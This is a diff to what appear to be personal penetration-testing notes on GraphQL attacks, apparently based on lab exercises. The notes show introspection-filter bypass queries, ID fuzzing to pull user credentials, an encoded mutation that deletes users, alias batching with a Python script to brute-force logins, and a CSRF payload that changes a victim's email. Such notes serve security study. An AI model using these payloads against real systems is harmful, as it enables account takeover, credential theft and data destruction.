@@ -203,12 +203,42 @@ Run a full query against the endpoint to gain full details on all queries, mutat
 >You may have to remove the onOperation, onFragment and onField directives as some endpoints do not accept them as part of introspection queries.
 
 Suggestions can be used to gather info on the structure. They're a feature of Apollo GraphQL where the server suggests query amendments in errors - generally used when query is incorrect but recognizable. [Clairvoyance](https://github.com/nikitastupin/clairvoyance) tool can be used to automatically recover all or part of a GraphQL schema.
+# Accessing Private GraphQL Posts
 
-Try to run an introspection query in Repeater by right-clicking and choosing "Set introspection query". Search for any hidden values or fields that are not sent by default and modify the original GraphQL query to include that field - it may include sensitive information.
+Try to run an introspection query in Repeater by right-clicking and choosing "Set introspection query". Search for any hidden values or fields that are not sent by default and modify the original GraphQL query to include that field - it may include sensitive information:
 
-If there is a ton of schema information, right click the request and "Save GraphQL queries to site map" to better understand the individual queries. If any query allows sending of a guessable ID (e.g. id=1), try fuzzing the value to potentially extract sensitive information.
+![[GraphQL Introspection.png]]
 
-Additionally, try inserting potentially hidden fields such as "postPassword" to the query to potentially extract sensitive information hidden from view but part of the object.
+If there is a ton of schema information, right click the request and "Save GraphQL queries to site map" to better understand the individual queries:
+
+![[GraphQL Queries in Site Map.png]]
+
+If any query allows sending of a guessable ID (e.g. id=1), try fuzzing the value to potentially extract sensitive information.
+
+Additionally, try inserting potentially hidden fields such as "postPassword" to the query to potentially extract sensitive information hidden from view but part of the object:
+
+![[postPass.png]]
+
+If so, try fuzzing the ID variable values to potentially gain access:
+
+![[PostPassword.png]]
+# Accidental Exposure of Private GraphQL Fields
+
+Analyse the website requests and responses for any instances of GraphQL - it may make a request for the login process:
+
+![[GraphQL Mutation.png]]
+
+If so, try running an introspection query and review the queries found:
+
+![[getUser.png]]
+
+There may be an interesting query to get user information that contains an ID value:
+
+![[GetUserReq.png]]
+
+Try changing the ID to various values to see if any user information is returned:
+
+![[admincreds.png]]
 # Bypass Introspection Defenses
 
 If introspection is disabled, insert a special character after the `__schema` keyword. Attempt to bypass the regex of excluding `__schema` in queries via spaces, newlines and commas since they are ignored by GraphQL but not by flawed regex:
@@ -227,6 +257,7 @@ Attempt to run a probe over an alternative method as well such as GET or POST re
     # Introspection probe as GET request
     GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
 ```
+# Finding Hidden GraphQL Endpoints
 
 If the GraphQL endpoint is hidden, attempt to find it using various common endpoints (/api, /graphql, etc..). If found, send a universal query:
 
@@ -234,8 +265,14 @@ If the GraphQL endpoint is hidden, attempt to find it using various common endpo
 /api?query=query{__typename}
 ```
 
+![[Query.png]]
+
 >[!info]
 >Try sending it as both a GET request (query=.....) and a POST request.
+
+Try sending an introspection query and test if it is blocked or not:
+
+![[Intro Disallowed.png]]
 
 Attempt various endpoint bypasses such as newlines (%0A). spaces (%20) or commas (%2c). Try to overcome the introspection defenses via various URL encoded queries such as:
 
@@ -249,11 +286,19 @@ Or the following which uses a newline:
 /api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
 ```
 
-Look at various queries in the site map and find interesting queries like getUser or deleteOrganizationUser and attempt to perform actions with different user IDs to grab passwords or delete users such as:
+![[Graph Bypass.png]]
+
+Look at various queries in the site map and find interesting queries like getUser or deleteOrganizationUser:
+
+![[Queries.png]]
+
+Attempt to perform actions with different user IDs to grab passwords or delete users such as:
 
 ```bash
 /api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
 ```
+
+![[ID 1 Value.png]]
 # Bypass Rate Limiting
 
 Aliases allow you to bypass multiple properties with the same name restriction by naming the properties you want to return. Aliases can return multiple instances of the same type of object in one request. Aliases can brute force a GraphQL endpoint.
@@ -275,8 +320,17 @@ Some rate limiters work based on the number of requests received rather than num
         }
     }
 ```
+# Bypassing Rate Limiting Using Aliases
 
-Analyse the login requests and note that it uses a mutation to send a login request with a username and password. Craft a query that contains multiple login mutations in one message:
+Analyse the login requests and note that it uses a mutation to send a login request with a username and password:
+
+![[MutationLog.png]]
+
+Try and attempt further login requests with incorrect credentials to test for a rate limit:
+
+![[Rate Limiting.png]]
+
+If so, try crafting a query that contains multiple login mutations in one message:
 
 ```json
 mutation {
@@ -294,6 +348,8 @@ mutation {
           }
     }
 ```
+
+![[attack123.png]]
 
 To create all 99 logins faster, create a simple Python script:
 
@@ -325,7 +381,9 @@ final_query = "\n".join(graphql_queries)
 print(final_query)
 ```
 
-Attempt to send all login credentials at once using mutations to brute force the password.
+Attempt to send all login credentials at once using mutations to brute force the password:
+
+![[mobilemail.png]]
 # GraphQL CSRF
 
 GraphQL can allow a CSRF attack to take place whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim. 
@@ -334,8 +392,13 @@ GraphQL can allow a CSRF attack to take place whereby an attacker creates an exp
 >POST requests that are JSON are secure as long as the content type is validated.
 
 Alternative methods like GET or a request that uses `x-www-form-urlencoded` can be sent by a browser. Attackers can craft malicious requests to send to the API. 
+# Performing CSRF Exploits over GraphQL
 
-Try to observe any sensitive functionality (changing email, updating account information, etc...). Attempt to change the request method to `application/x-www-form-urlencoded` either manually or by "Change request method" twice.
+Try to observe any sensitive functionality (changing email, updating account information, etc...):
+
+![[EmailGraphQL.png]]
+
+Check if you can use the session cookie to send multiple requests by changing the email and re-submitting the request. If so, attempt to change the request method to `application/x-www-form-urlencoded` either manually or by "Change request method" twice.
 
 As an example, a standard email change request may be:
 
@@ -357,6 +420,8 @@ Try re-submitting with a new email to ensure a session token can be reused to se
 query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
 ```
 
+![[CSRFBody.png]]
+
 Which decodes to:
 
 ```json
@@ -369,11 +434,11 @@ query=
 &operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
 ```
 
+Try generating a CSRF PoC and change the HTML so it changes the email again:
+
+![[pwnedNET.png]]
+
 >[!info]
 >Make sure not to encode the "=" characters.
 
 If it works successfully, send the CSRF PoC successfully to the victim, making sure to change the email to a different one that tested.
-
-
-
-
